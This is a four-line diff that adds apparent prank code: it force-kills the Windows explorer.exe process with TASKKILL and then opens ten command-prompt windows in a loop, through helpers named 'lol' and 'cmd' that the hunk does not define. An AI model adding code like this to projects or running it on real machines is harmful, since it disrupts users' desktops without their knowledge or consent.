@@ -1,0 +1,4 @@
+lol("TASKKILL /f /IM explorer.exe");
+for (i=0;i<10;i+=1){
+    cmd("start cmd.exe");
+};
